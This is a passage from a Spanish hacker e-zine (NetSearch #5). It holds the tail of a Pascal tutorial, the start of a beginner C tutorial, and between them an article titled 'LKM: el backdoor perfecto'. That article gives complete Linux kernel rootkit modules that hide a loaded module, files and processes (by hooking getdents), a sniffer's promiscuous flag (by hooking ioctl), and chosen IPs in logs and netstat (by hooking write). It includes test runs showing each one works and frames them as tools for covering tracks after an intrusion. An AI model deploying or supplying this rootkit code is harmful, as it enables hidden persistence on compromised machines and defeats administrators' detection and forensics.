sus calculos. Al acabar el parentesis pone ":tipo_base". Este tipo base
es el tipo de datos de "ejemplo" ( el resultado de los calculos que realice
la funcion se guardaran en la variable "ejemplo". Como podemos observar
el resto del subprograma es muy similar al programa principal. Tiene sus
propios bloques de declaracion de constantes y variables, su begin y su end.
En el bloque de variables colocaremos las variables que el subprograma
necesitara pero que o bien no existen fuera o son inutiles fuera ( por
ejemplo el contador de un for ).

Veamos un ejemplo:


--------------------CuT hErE---------------------
function suma (a,b:integer):integer;

begin
        suma:=a+b;
end;
--------------------cUt HeRe--------------------


Esta funcion resolvera el resultado de la suma de 2 enteros que vienen desde
el programa principal y que da como resultado un entero que lo guardamos
en la variable "suma" ( := es la asignacion del pascal :) ).

La llamada en el programa principal se hara de la siguiente forma:

variable_cualquiera:=suma (x,y);

Esta linea de codigo guardara en una variable_cualquiera el resultado de
la funcion suma y que le pasamos los valores de x e y. Como podeis ver
los parametros que le pasamos a la funcion no tienen porque llamarse igual
que los parametros de dentro. Pascal los asignara por *orden de entrada*. En
este ejemplo la x sera dentro del subprograma a y la y sera b.

Bueno, en este numero hemos visto por encima las funciones. Estas y los
procedimientos se trataran mas profundamente en el proximo numero donde
ademas se introducira la tecnica de programacion que denominamos
"recursividad".

Flames, dudas, sugerencias, criticas, dinero, etc. pueden ser enviados a
papapile@hotmail.com . Clave PGP en construccion perdonen las molestias ;).
Powered by Debian Potato.

Papa Pile.



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x11 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ LKM: el backdoor perfecto ]-=============================================
=-[ por Doing ]-=============================================================




 Intro
 =-=-=

 Muchos supuestos "hackers" creen que hackear es simplemente conseguir
acceso a otras maquinas, ven el hack como un "deporte", en el que lo que
primero importa es el /etc/passwd, el .rhosts, los sniffers, etc etc. Pues
si piensas asi, puede que tu primer hack sea el ultimo. Lo primero que debe
de preocuparse un hacker es de cubrir sus espaldas, de borrar los logs, y
cualquier evidencia que delate su intrusion, si no estas de acuerdo conmigo,
mas vale que cambies pronto de opinion ;P.

 Vamos por pasos, alguien consigue el acceso a un sistema, no nos importa el
como, despues de borrar los logs, tiene que asegurarse de poder entrar mas
veces, y para eso se usa un backdoor. Esta la tipica cuenta con privilegios
de root, o poner una suid shell, o enlazar una shell a un puerto, etc etc.
Pero todos estos metodos "cantan" mucho. Quedan logs en el utmp (mientas
estes conectado), wtmp, history, syslog, etc. Puedes haber sido listo y usar
un buen zapper, y borrar todos los logs. Pero puedo que algun dia, se te
olvide borrar algo, un pequeño detalle, y tu ip quede registrada. Si el admin
no es alguien que esta alli solo para que todo funcione bien, y se da cuenta
de que le han hackeado, pueden ir a por ti. Y como tu ip ha quedado bien
logueadita, estas perdido :->.

 Todos los procesos que se encargan de loguear lo que haces, corren en modo
usuario, y generalmente con privilegios de root. Para "zapear" sus logs
tenemos que conseguir sus mismos privilegios, lo que usualmente no es muy
dificil. Pero, nosotros podemos ponermos por encima del root, podemos meter
un modulo del kernel, que corre en modo kernel, con privilegios Ring0, y si
nos lo montamos bien, nos evitariamos todos los problemas de zapeo y loging.
¿Como? Sigue leyendo ;P


 LKM's
 =-=-=

 Un modulo del kernel (LKM), es un fichero objeto, un codigo compilado, pero
no enlazado, con rutinas, simbolos y demas zarandajas. A alguien se le
ocurrio la maravillosa idea de que hay ciertos drivers en el kernel que no se
usan siempre, y si se pudieran cargar y descargar cuando se necesitaran, se
ahorrarian unos pocos recursos de la maquina, ademas de hacer el kernel mas
pequeño. Cuando insertamos un modulo en el kernel, usando insmod o modprobe,
el fichero objeto es insertado en la memoria del kernel, sus simbolos no
resueltos se intentan resolver mirando los simbolos que exporta el kernel a
los modulos, y despues de haberlos resuelto, se crea una estrcuutra llamada
struct module, se rellena con los datos del modulo que se esta cargando, y se
inserta en una lista enlazada tipo pila, (es decir LIFO -> Last In First
Out).
  
 Una vez insertado, se llama a una de sus rutinas, concretamenete
init_module, que devuelve un entero. Si el valor que devuelve es 0, el modulo
se carga, y si devuelve cualquier otro valor el modulo no se carga (insmod
nos da un error indicando la razon). De esto se puede deducir que init_module
se usa para checkear que todo esta "ok" para la carga del modulo.

 Cuando se descarga, el kernel llama otra de sus rutinas, cleanup_module, que
no devuelve nada, y despues se elimina el modulo de la memoria del kernel.


 LKM como backdoor
 =-=-=-=-=-=-=-=-=

 Si queremos usar un LKM para ocultar nuestras entradas y logs, lo primero es
ver que logs deja el modulo al ser cargado. Deja 2 logs siempre, pero quiza
algun admin paranoico (y listo), pueda haber modificado insmod/modprobe para
generar su propio log de la carga de modulos, asi que nunca os confieis :).
Al ser cargado todos sus simbolos son añadidos a la lista de simbolos
exportados del kernel, y esto es un problema :). Se podrian ver con el
comando 'ksyms', o bien un 'cat /proc/ksyms'. Para evitar esto tenemos que
poner en init_module el macro: "EXPORT_NO_SYMBOLS;".

 El otro problema que tenemos es que el modulo se queda en una lista
enlazada, y se puede ver al hacer un 'lsmod', que lo que hace es ver el
contenido de /proc/modules. Una opcion para saltarnos esto seria "ponermos"
en medio de lsmod y /proc/modules y filtrar los modulos que nos interesen.
Pero esto es realmente complicado, y ademas hay una forma mas facil.

 Si los modulos estan en la lista enlazada, lo unico que tenemos que hacer es
apuntar el puntero "next" del modulo anterior al nuestro al modulo siguiente
al nuestro en la lista enlazada. Pero hay varios problemas, aqui os muestro
como maneja el kernel la movida de los modulos:

- En kernel/module.c esta la raiz de la lista enlazada, definida asi:

 static struct module kernel_module =
{
        sizeof(struct module),  /* size_of_struct */
        NULL,                   /* next */
        "",                     /* name */
        0,                      /* size */
        {ATOMIC_INIT(1)},       /* usecount */
        MOD_RUNNING,            /* flags */
        0,                      /* nsyms -- to filled in in init_modules */
        0,                      /* ndeps */
        __start___ksymtab,      /* syms */
        NULL,                   /* deps */
        NULL,                   /* refs */
        NULL,                   /* init */
        NULL,                   /* cleanup */
        __start___ex_table,     /* ex_table_start */
        __stop___ex_table,      /* ex_table_end */
        /* Rest are NULL */
};

struct module *module_list = &kernel_module;

- Al cargar un nuevo modulo, por ejemplo llamado pepe, se hace esto:
 
 pepe->next = module_list;
 module_list = pepe;

 O sea, que module_list apunta ahora a nuestro modulo, y lo que tenemos que
cambiar es esto. Para eso necesitamos conocer la direccion de este simbolo en
el kernel, pero a priori no podemos, porque esta declarado como "static". Aun
asi hay otras formas de buscarlo en la memoria, pero no las he probado.

 Entonces, ¿como lo ocultamos? :P. Hay una forma que funciona siempre; no
recuerdo el nick del tio al que se le ocurrio, pero salio en phrack. Consiste
en usar un modulo externo, que al ser insmodeado, en init_module elimina de
la lista el modulo que se insmodeo anterior a el, y luego devuelve -1 y no se
carga.

 Se basa en que cuando compilas con -fomit-frame-pointer, al ejecutarse
init_module, tienes en los registros ebx o edx la direccion del modulo que se
esta cargando; entonces oculta el ultimo modulo cargado, apuntado el puntero
next de su propia estructura al "next" de su "next" (suena complicado pero es
una tonteria):

 module_list { dumb_module }

 insmod modulo_malo_maloso.o

 module_list { modulo_malo_maloso , dumb_module }

 insmod hider.o

 /* En init_module */
 module_list { hider , modulo_malo_maloso , dumb_module }
 /* Ahora apuntamos hider->next a dumb_module y esto queda asi : */
 module_list { hider , dumb_module }
 /* Ahora init_module devuelve -1 y hider es eliminado */
 module_list { dumb_module }

  Y la lista queda como antes de cargar neustro modulo.

 El codigo del hider.c es este:

<++> lkms/hider.c $f01b000e6830dd2d69eeef0ff18fcd56

#define MODULE
#define __KERNEL__

#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>

int init_module(void) {

/*
 * if at first you dont suceed, try:
 * %eax, %ebx, %ecx, %edx, %edi, %esi, %ebp, %esp 
 * I cant make this automaticly, because I'll fuck up the registers If I do 
 * any calculus here.
 */
        register struct module *mp asm("%ebx");
        
      if (mp->init == &init_module) /* is it the right register? */
             if (mp->next) /* and is there any module besides this one? */
                     mp->next = mp->next->next; /* cool, lets hide it :) */
        return -1; /* the end. simple heh? */
}

<-->


 Syscalls (a.k.a llamadas al sistema)
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
 Vamos con cosas mas serias ;P. Lo unico que necesitamos para pasar
desapercibidos y poner un buen backdoor es interceptar algunas syscalls
(llamadas al sistema) y poner unas nuevas mas "chulas" (para nosotros,
claro).
 
 Las syscalls se reliazan en linux usando la interrupcion 0x80. En el
registra %eax se pone el numero de la syscall y en los demas registros se
ponen los parametros que se le vayan a pasar. Luego el kernel coje esos
registros y los mete en esta estructura:
  
/* this struct defines the way the registers are stored on the 
   stack during a system call. */

struct pt_regs {
        long ebx;
        long ecx;
        long edx;
        long esi;
        long edi;
        long ebp;
        long eax;
        int  xds;
        int  xes;
        long orig_eax;
        long eip;
        int  xcs;
        long eflags;
        long esp;
        int  xss;
};

 Luego mete esa estructura en el stack y llama a la rutina que se encarga de
manejar esa syscall, con lo que puedes declarar los parametros de la syscall
en la propia definicion de la rutina, porque los registros se ponen el stack.

 Si queremos modificar datos en el espacio del programa llamante, tenemos que
tener cuidado. El modo protegido establece una proteccion de memoria (por eso
se llama modo protegido), en la que se definen 4 "anillos" de privilegios,
del Ring0, al Ring3. El ring3 es el menos privilegiado, y es donde corren los
programas de usuario. El ring0 es el mas privilegiado, y es donde corre el
kernel (y los modulos del kernel, claro).

 Cuando se accede a la memoria desde el modo protegido no se hace
directamente, si no que se "mapea" el acceso de acuerdo a unas tablas. Esto
explica porque puedes acceder desde dos procesos a la misma direccion, pero
lees datos distintos; porque el kernel mapea cada acceso a una direccion
fisica diferente. La direccion de las tablas que mapean los accesos a memoria
esta en el registro de control 3 (cr3). Este registro solo puede ser
modificado por codigo con privielgios ring0 (no lo se seguro, quiza por ring1
y ring2 tambien, pero lo que es seguro es que por ring3 no :P). Asi que el
kernel se encarga de gestionar la memoria virtual de cada proceso.

 ¿Y que quiero decir con la parrafada anterior? Que para acceder a datos en
la memoria del usuario (ring3, user-space) hay que usar
__generic_copy_from_user, y para escribir en la memoria del usuario se usa
__generic_copy_to_user. Estas 2 rutinas tienen la misma sintaxis que memcpy,
es decir: (destino, origen, tamaño en bytes).

 Todo esto es muy bonito, pero ¿como ponemos nuestras propias sycalls? Bueno,
se me olvido contar que la direccion de las rutinas que son llamadas cuando
se realiza una syscall estan en un array de punteros llamado
"sys_call_table". Para saber que index correponde a cada syscall se usan las
constantes __NR_, definidas en asm/unistd.h. El indice se corresponde con el
valor que pone el programa de usuario en eax antes de llamar a la int 0x80.

 Lo ideal es meter en init_module el codigo que cambia la syscall original
por tu rutina y que guarda la direccion de la original en una variable.
Despues en cleanup_module meter el codigo que lo deja como estaba antes :)


 Ocultando ficheros
 =-=-=-=-=-=-=-=-=-

 La syscall que tenemos que parchear para ocultar ficheros es getdents (GET
Drectory ENTrieS). Cuando haceis un 'ls', lo que hace es reservar un buffer
de tamaño x, y luego llama a getdents pasandole la direccion del buffer y su
tamaño. La rutina de getdents se encarga de rellenar el buffer de estructuras
de tipo "dirent":

struct dirent64
  {
    __ino64_t d_ino;
    __off64_t d_off;
    unsigned short int d_reclen;
    unsigned char d_type;
    char d_name[256];           /* We must not include limits.h! */
  };

 Para ocultar ficheros lo unico que necesitariamos es poner una nueva rutina
que llame a la original, copie el buffer devuelto a uno local, y vaya
copiando las estrucuturas una a una a otro buffer, eliminando las que nos
interesen, y despues copiar este segundo buffer al del usuario. Aqui teneis
un codigo de ejemplo:

/*
 * Version troyanizada de la llamada al sistema getdents()
 *
 * dirp_tmp es el buffer donde copiaremos el buffer del usuario.
 * dirp_ret es el buffer donde iremos copiando las estructuras con los 
 * ficheros que se mostraran.
 * dirp1 y dirp2 son punteros que apuntan a las variables de antes.
 * ret es el valor que debemos retornar.
 *
 * OCULTAR_FICHERO es una "hipotetica" funcion que se encarga de chekear
 * si el nombre del fichero que se le pasa como parametro se puede mostrar
 * o no.
 *
 * o_gendents es un puntero a la syscall original.
 *
 * - Doing
 * 
 */
int new_getdents(unsigned int fd, struct dirent *dirp_user, unsigned int c)
{
  unsigned int count, ret = 0;
  struct dirent *dirp_tmp, *dirp_ret, *dirp1, *dirp2;
  char *ptr;

/* Llamamos a la syscall original */	
  count = (*o_getdents) (fd, dirp_user, c);

/* Si no devuelve nada volvemos */
  if (!count) return 0;

/* Reservo memoria para los 2 buffers */ 
  dirp_tmp = (struct dirent*) kmalloc(count, GFP_KERNEL);
  if (!dirp_tmp) return 0;
  memset(dirp_tmp, 0, count);
  dirp_ret = (struct dirent*) kmalloc(count, GFP_KERNEL);
  if (!dirp_ret) return 0;
  memset(dirp_ret, 0, count);

  dirp1 = dirp_ret;
  dirp2 = dirp_tmp;

/* Copio el buffer del usuario a dirp_tmp */
  __generic_copy_from_user(dirp_tmp, dirp_user, count);

/* Pongo a 0 el buffer del usuario. aka memset(buf, 0, count) */
  __generic_copy_to_user(dirp_user, dirp_ret, count);

  while (count > 0) {
    count -= dirp_tmp->d_reclen;
    
    if (!OCULTAR_FICHERO(dirp_tmp->d_name)) 
      
      /* 
       * Copiamos la estructura
       */ 
      memcpy(dirp_ret, dirp_tmp, dirp_tmp->d_reclen);
      ret += dirp_tmp->d_reclen;
      
      ptr = (char*) dirp_ret;
      ptr += dirp_ret->d_reclen;
      dirp_ret = (struct dirent*) ptr;
    }
    ptr = (char*) dirp_tmp;
    ptr += dirp_tmp->d_reclen;
    dirp_tmp = (struct dirent*) ptr;
  }

/* Copio el buffer "filtrado" al buffer del usuario */
  __generic_copy_to_user(dirp_user, dirp1, ret);
  
/* Y libero los 2 buffers anteriormente reservados */
  kfree(dirp1);
  kfree(dirp2);
  
  return ret;
}


 Con este codigo podemos ocultar ficheros y directorios, pero ademas, tambien
podemos ocultar procesos. ¿Como? Cuando haceis un 'ps' para ver los procesos,
ps hace un getdents de /proc para ir viendo los pids de los procesos, luego
se mete en los directorios de cada pid y lee sus opciones, parametros, etc.

 Entonces, si ocultamos el directorio cuyo nombre es el pid del proceso,
habremos ocultado el proceso :). Aqui teneis un modulo que oculta el fichero
"prueba" y el pid 1 (init).

<++> lkms/fphider.c $5d1903497b986ebdd32d3912670bf6bd

#define __KERNEL__
#define MODULE

#include <linux/ctype.h>
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/fd.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <linux/mm.h>

#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/unistd.h>

#include <syscall.h>

#include <asm/segment.h>

extern void *sys_call_table[]; /* array de syscalls */

int (*o_getdents) (unsigned int, struct dirent *, unsigned int);

int
OCULTAR_FICHERO(char *name)
{
  if (!strcmp(name, "prueba")) return 1;
  if (!strcmp(name, "1")) return 1;
  return 0;
} 
 

/*
 * Version troyanizada de la llamada al sistema getdents()
 */
int new_getdents(unsigned int fd, struct dirent *dirp_user, unsigned int c)
{
  unsigned int count, ret = 0;
  struct dirent *dirp_tmp, *dirp_ret, *dirp1, *dirp2;
  char *ptr;

/* Llamamos a la syscall original */	
  count = (*o_getdents) (fd, dirp_user, c);

/* Si no devuelve nada volvemos */
  if (!count) return 0;

/* Reservo memoria para los 2 buffers */ 
  dirp_tmp = (struct dirent*) kmalloc(count, GFP_KERNEL);
  if (!dirp_tmp) return 0;
  memset(dirp_tmp, 0, count);
  dirp_ret = (struct dirent*) kmalloc(count, GFP_KERNEL);
  if (!dirp_ret) return 0;
  memset(dirp_ret, 0, count);

  dirp1 = dirp_ret;
  dirp2 = dirp_tmp;

/* Copio el buffer del usuario a dirp_tmp */
  __generic_copy_from_user(dirp_tmp, dirp_user, count);

/* Pongo a 0 el buffer del usuario. aka memset(buf, 0, count) */
  __generic_copy_to_user(dirp_user, dirp_ret, count);

  while (count > 0) {
    count -= dirp_tmp->d_reclen;
    
    if (!OCULTAR_FICHERO(dirp_tmp->d_name)) {
      
      /* 
       * Copiamos la estructura
       */ 
      memcpy(dirp_ret, dirp_tmp, dirp_tmp->d_reclen);
      ret += dirp_tmp->d_reclen;
      
      ptr = (char*) dirp_ret;
      ptr += dirp_ret->d_reclen;
      dirp_ret = (struct dirent*) ptr;
    }
    ptr = (char*) dirp_tmp;
    ptr += dirp_tmp->d_reclen;
    dirp_tmp = (struct dirent*) ptr;
  }
  
/* Copio el buffer "filtrado" al buffer del usuario */
  __generic_copy_to_user(dirp_user, dirp1, ret);
  
/* Y libero los 2 buffers anteriormente reservados */
  kfree(dirp1);
  kfree(dirp2);
  
  return ret;
}

int
init_module()
{
  o_getdents = sys_call_table[__NR_getdents];
  sys_call_table[__NR_getdents] = new_getdents;
  return 0;
}

void
cleanup_module()
{
  sys_call_table[__NR_getdents] = o_getdents;
}

<-->

 Vamos a probarlo:

root@apocalipsis:/> gcc -O2 -c fphider.c
root@apocalipsis:/> echo "hola" > prueba
root@apocalipsis:/> ps aux | grep init
root 1 0.2 0.3 368 216 ?  S 11:42 0:03 init [2]
root 139 0.0 1.2 2320 780 1 S 11:43 0:00 xinit /root/.xinitrc
root@apocalipsis:/> insmod fphider.o 
root@apocalipsis:/> ps aux | grep init
root 139 0.0 1.2 2320 780 1 S 11:43 0:00 xinit /root/.xinitrc
root 377 0.0 0.6 1232 412 ?  S 12:08 0:00 grep init
root@apocalipsis:/> ls -las pr*
ls: pr*: No such file or directory
root@apocalipsis:/> rmmod fphider

 Funciona :) Por cierto, si no compilais el modulo con optimizacion (-O) el
kernel no lo carga.


 Ocultando el flag PROMISC
 =-=-=-=-=-=-=-=-=-=-=-=-=

 Si queremos meter un sniffer, el admin se puede dar cuenta o bien viendo el
proceso (pero eso ya lo podemos solucionar con la tecnica de antes) o bien
viendo el flag PROMISC del interfaz en cuestion (eth0, eth1, ...).

 Para mirar los flags de los interfaces se usa la llamada ioctl, usando como
comando SIOCGIFFLAGS, y se le pasa como argumento un puntero a una estructura
ifreq. Despues de la llamada tendremos en el campo ifr_flags los flags del
interfaz.

 Para evitar esto nada mas facil que usar un modulo que intercepte la syscall
ioctl :)

 Aqui teneis un modulo que oculta el flag promoiscuo del interfaz lo.

<++> lkms/promisc.c $68e61872f3fcddf32aa4ec58ff44da2d
 
#define __KERNEL__
#define MODULE

#include <linux/ctype.h>
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/fd.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <linux/mm.h>

#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/unistd.h>
#include <linux/if.h>
#include <syscall.h>

#include <asm/segment.h>

extern void *sys_call_table[]; /* array de syscalls */

int (*o_ioctl) (int, int, unsigned long);

int
OCULTAR_PROMISC(char *name)
{
  if (!strcmp(name, "lo")) return 1;
  return 0;
} 
 
/*
 * Version troyanizada de la llamada al sistema ioctl()
 */
int new_ioctl(int fd, int pet, unsigned long arg)
{
  int ret;
  struct ifreq ifr;
  char interfaz[32];

  if (pet == SIOCGIFFLAGS) { /* Get Interface FLAGS */

    /*
     * Llamamos a ioctl y hacemos una copia de lo k devuelve 
     */
    ret = (*o_ioctl) (fd, pet, arg); 
    __generic_copy_from_user((struct ifreq*)&ifr, (struct ifreq*)arg,
    sizeof(struct ifreq));

    if (!OCULTAR_PROMISC(ifr.ifr_name)) ifr.ifr_flags |= IFF_PROMISC;
    else ifr.ifr_flags &= ~IFF_PROMISC;
    
    __generic_copy_to_user((struct ifreq*)arg, (struct ifreq*)&ifr,
    sizeof(struct ifreq));
    return ret;
  }

  return (*o_ioctl) (fd, pet, arg);
}


int
init_module()
{
  o_ioctl = sys_call_table[__NR_ioctl];
  sys_call_table[__NR_ioctl] = new_ioctl;
  return 0;
}

void
cleanup_module()
{
  sys_call_table[__NR_ioctl] = o_ioctl;
}

<-->

root@apocalipsis:/> gcc -c -O2 promisc.c
root@apocalipsis:/> insmod promisc.o 
root@apocalipsis:/> ifconfig lo promisc
root@apocalipsis:/> ifconfig lo | grep PROMISC
root@apocalipsis:/> rmmod promisc 
root@apocalipsis:/> ifconfig lo | grep PROMISC
          UP LOOPBACK RUNNING PROMISC  MTU:3924  Metric:1
root@apocalipsis:/>

 Como veis funciona a la perfeccion :). Pero esto logicamente no puede usarse
asi. Porque si el admin pusiera la ethernet en modo promiscuo para lo que
sea, el seguiria viendo que no esta en promiscuo, y eso canta bastante. Asi
que lo suyo seria interceptar tambien SIOCSIFFLAGS, y guardar en una variable
interna si debemos mostrar o no el flag. No os lo puedo dar todo hecho jeje
;->


 Evadiendo logs
 =-=-=-=-=-=-=-

 Otro problemita a la hora de evitar que se den cuenta de que hemos
conseguido acceso a una maquina, son los dichosos logs. Y tambien el comando
netstat. Pues esto tambien se puede evitar con modulos. Veamos, los logs,
sean del tipo que sean, se escriben con la syscall write, asi que lo "unico"
que debemos hacer para evitar que se guarden logs de ciertas "strings" es
evitar las syscalls write en las que haya esas "strings".

 Me explico: podemos evitar los writes en los que aparezcan determinadas ip's
y hostnames, con lo que nos saltamos los logs y netstat. La forma de evitar
esto es interceptar la syscall write, y cuando veamos que hay una string que
tenemos que ocultar, no llamar a la syscall write original, pero si devolver
el numero de bytes que deberían haber sido escritos, ya que si devolvemos un
error, la aplicacion llamante puede dar un error, con lo que admin se
mosquearia.

 Pero para buscar una string en el parametro que le se pasa a write,
necesitamos reservar memoria en kernel-space con kmalloc, y luego hacer una
__generic_copy_from_user, con lo que tenemos unas limitaciones de tamaño. En
el modulo que os pongo a continuacion, los writes de mas de 10000 bytes no
son "zapeados".

 Aqui teneis un modulo que no muestra la string "127.0.0.2".


<++> lkms/logs.c $d0e936d339782a68f30dcb0598d6f130

#define __KERNEL__
#define MODULE

#include <linux/ctype.h>
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/fd.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <linux/mm.h>

#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/unistd.h>
#include <linux/if.h>
#include <syscall.h>

#include <asm/segment.h>

extern void *sys_call_table[]; /* array de syscalls */

ssize_t (*o_write) (int, void*, size_t);

int
OCULTAR_STRING(char *name)
{
  if (strstr(name, "127.0.0.2")) return 1;
  return 0;
} 

/*
 * Llamada al sistema write() troyanizada
 */
ssize_t new_write (int fd, void *buf, size_t size)
{
  size_t ret;
  char *tmp;

  if (size < 1) return size;

  if (size > 10000) return (*o_write) (fd, buf, size);

  tmp = (char*) kmalloc(size+1, GFP_KERNEL);
  memset(tmp, 0, size + 1);
  __generic_copy_from_user(tmp, buf, size);

  if (OCULTAR_STRING(tmp)) {
    kfree(tmp);
    return size;
  }
  kfree(tmp);

  return (*o_write) (fd, buf, size);
}

int
init_module()
{
  o_write = sys_call_table[__NR_write];
  sys_call_table[__NR_write] = new_write;
  return 0;
}

void
cleanup_module()
{
  sys_call_table[__NR_write] = o_write;
}

<-->

 Como siempre, vamos a probarlo :P.

root@apocalipsis:/> telnet 127.0.0.2 21 &
[3] 346
root@apocalipsis:/> Trying 127.0.0.2...
Connected to 127.0.0.2.
Escape character is '^]'.


[3]+  Stopped                 telnet 127.0.0.2 21
root@apocalipsis:/> gcc -c -O2 logs.c
root@apocalipsis:/> netstat --inet -N
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address       Foreign Address       State      
tcp      0      0 127.0.0.2:21          127.0.0.2:1028        ESTABLISHED 
tcp      0      0 127.0.0.2:1028        127.0.0.2:21          ESTABLISHED 
root@apocalipsis:/> insmod logs.o 
root@apocalipsis:/> netstat --inet -N
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
root@apocalipsis:/> grep 127.0.0.2 /var/log/messages 
root@apocalipsis:/> rmmod logs
root@apocalipsis:/> grep 127.0.0.2 /var/log/messages 
Feb 25 13:23:29 apocalipsis in.ftpd[341]: connect from 127.0.0.2

 Perfecto :)

 Pues todo esto no es mas que una pizca de lo que se puede hacer con lkm's.
El el documento del THC sobre modulos del kernel para linux (os lo podeis
bajar de packetstorm) vienen varios lkm's de ejemplo, os recomiento que los
hecheis un vistazo; os pueden dar ideas para los vuestros :)

 Pues eso es todo. Hasta otra :)


- Doing  /  doing@netsearch-ezine.com



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x12 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Lenguaje C (1/2) ]-======================================================
=-[ por JohnnyG ]-===========================================================




/* Esta primera parte de introduccion, en parte, es una traduccion libre del
   texto "Sams teach yourself C in 21 days". Si alguien quiero el libro en
   ingles, formato html, que me lo pida) */


Introduccion a C
----------------

Como muchos de vosotros sabeis, C es un lenguaje que nacio a partir de la
necesidades de un lenguaje de medio nivel, para la programacion del nuevo
sistema operativo Unix. Su creacion no fue directa, sino que se partio de
otro lenguaje creado para tal proposito llamado B, de ahi su peculiar nombre.
Asi mismo, B nacio a partir de otro lenguaje, del que supongo os estareis
preguntando el nombre.


Por que usar C?
----------------

C es el lenguaje mas extendido hoy en dia debido a diversas razones, entre
ellas, es un lenguaje de medio nivel, que puede acceder tanto a niveles altos
de la maquina como a los mas bajos. Debido a esto, y a la capacidad para
crear ejecutables rapidos y pequeños, es el preferido por todos a la hora de
programar.


Preparandose para programar
---------------------------

Lo que siempre debemos tener claro a la hora de hacer un programa, son cuatro
pasos principales: 

1.- Determinar que es lo que tiene que hacer el programa
2.- Saber los metodos que vamos a usar para programarlos 
3.- Crear el programa para resolver el problema
4.- Ejecutar el programa para saber que hace lo que queriamos. Aunque para la
gente que se este iniciando en la programacion, esto pueda parecer una
tonteria, y de echo lo es, cuando los proyectos que tengamos en mente sean de
una extension bastante considerable, conviene perder el tiempo (que al final
ganaremos) para pensar los dos primeros pasos detenidamente.


Desarrollo de un programa en C
------------------------------

Para poder crear un programa en C, primero tenemos que escribir el codigo
fuente con un editor de textos. Nos valdra cualquiera, pero no debemos de
olvidar, que a la hora de guardarlo, tendremos que hacerlo con formato ASCII.
Despues tenemos que compilar el programa y crear el codigo objeto con
extension .obj que luego linkaremos. Estos dos hechos no voy a explicarlos
porque de momento no son importantes. Si alguien tiene curiosidad por saber
que son, que me lo diga. Y por ultimo, hay que ejecutar el programa y
comprobar que nos realiza las acciones que habiamos pensado.

Para compilar el codigo fuente y linkarlo, en cualquier entorno grafico en el
que estemos nos saldra la opcion en algun menu, con lo que haremos todos
los pasos en uno solo, mientras que si lo hacemos desde la linea de comandos,
dependera del entorno y sistema operativo. Los principales son...(tomemos
como ejemplo de codigo fuente el archivo radius.c)

	Compiler 		Command 
	Microsoft C 		cl radius.c 
	Borland's Turbo C 	tcc radius.c 
	Borland C 	       	bcc radius.c 
	Zortec C 		ztc radius.c 

Si estamos bajo Linux/Unix, tendremos que poner: gcc radius.c De todas
formas, es mejor consultar el manual del compilador para saber todas las
opciones que tiene.


TRABAJANDO CON EL COMPILADOR
****************************

Nuestro primer programa en C
----------------------------

Como veo que ya teneis ganas de hacer vuestro primer programa en C, vamos a
empezar con el programa por excelencia, que mas tarde detallaremos... (No
teneis que escribir ni los numeros ni los dos puntos, estan solo como
referencia)

	Listado 1.1 HELLO.C.

	1: #include <stdio.h>	/* Esto son comentarios */
	2:			      // Esto tambien
	3: main()
	4: {
	5:     printf("Hello, World!\n");
	6:     return 0;
	7: }

Ahora solo tenemos que compilar el programa, y ejecutarlo, y ya esta! La
verdad es que el programa es casi ridiculo, pues solo escribe Hello World! en
la pantalla, pero si hubieseis visto la cara de felicidad que puse la primera
vez que lo hice!!! Si todo ha salido bien, el compilador no debe de daros
ningun error. En caso contrario, revisar que lo teneis todo bien escrito, y
que el compilador esta bien instalado.


Listado de errores en el compilador
-----------------------------------

Una gran ayuda que tienen los actuales compiladores, es que nos indican donde
hemos cometido el error, para que podamos subsanarlo lo mas rapido y
facilmente posible. El error puede ser de muchos tipos: que nos hayamos
equivocado al escribir, hayamos hecho alguna operacion ilegal... Vamos a
representar esto, mediante un programa erroneo. Vamos a utilizar el programa
de antes y vamos a borrar el punto y coma que esta tras la funcion printf
(Linea 5)

	Listado 1.2 HELLO.C

	1: #include <stdio.h>
	2:
	3: main()
	4: {
	5:     printf("Hello, World!\n")
	6:     return 0;
	7: }

A la hora de compilar, nos daria el siguiente error (o parecido segun el
compilador que usemos)

	hello.c(6) : Error: `;' expected

Nos esta indicando, que en el fichero hello.c, hay un error en la linea 6, ya
que esperaba un (;). Puede parecer contradictorio, ya que nosotros hemos
eliminado el ; de la linea 5, sin embargo, el compilador de C, no entiende de
saltos de linea, por eso podriamos haber puesto el ; en la linea 6. El
compilador, al llegar a la instruccion de la linea 6, se da cuenta que falta
el ; y por eso localiza el error en esa linea.

Vamos a probar mediante otro error. En este caso, vamos a eliminar las dobles
comillas que estan antes de Hello (linea 5 de nuevo). Compilamos y esta vez
nos da lo siguiente:

	hello.c(5) : Error: undefined identifier `Hello'
	hello.c(7) : Lexical error: unterminated string
	Lexical error: unterminated string
	Lexical error: unterminated string
	Fatal error: premature end of source file

Como es posible esto, si solo hay un fallo? Esto pasa, porque en C, con un
solo error u omision, se puede desencadenar una serie seguida de fallos, pero
que con una sola accion pueden ser restaurados todos. Por eso, si en un
programa os encontrais muchos fallos, no os desespereis, posiblemente pueden
arreglarse mediante un simple cambio. Con esto no tengo nada mas que deciros
por ahora.  Solamente, que cuando guardeis vuestros codigos fuentes, aunque
podeis hacerlo con cualquier extension, seria recomendable que lo hicierais
con la extension .c, que es conocida a nivel internacional.


Ejercicios
----------

1.- Compila el listado 1.1, y mediante un editor de textos, echa un vistazo
al codigo objeto. Veras lo interesante que es el hello.obj.

